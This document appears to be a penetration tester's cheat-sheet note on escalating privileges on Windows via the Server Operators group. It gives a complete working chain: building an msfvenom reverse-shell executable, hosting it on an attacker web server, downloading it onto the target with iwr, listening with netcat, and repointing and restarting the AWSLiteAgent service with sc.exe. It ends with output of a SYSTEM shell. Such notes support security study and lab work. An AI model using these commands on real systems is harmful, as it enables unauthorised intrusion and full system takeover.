
When an user is part of the "Server Operator" Group he can overwrite Service Configurations and point services to malicious .exe files. Without having the need of write permissions to the service.exe or .dll.

After finding out your Service Operator do this:

1. Enumerate Services

[[Windows Enum Services & Processes]]

2. Create malicious binary with "msfvenom".

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

3. Start up python webserver on local machine.

```
python3 -m http.server 80
```

3. Download .exe onto target server.

```
iwr -uri http://192.168.227.246/shell.exe -o shell.exe
```

4. Start up listener.

```
rlwrap nc -lvnp 443
```

5. Point the Service to our malicious .exe file.

```
sc.exe config AWSLiteAgent binPATH= "C:\temp/shell.exe"
```

6. Stop Service

```
sc.exe stop AWSLiteAgent
```

7. Start Service 

```
sc.exe start AWSLiteAgent
```

8. Gained RCE as user "NT AUTHORITY\SYSTEM".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.174.134] 54043
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
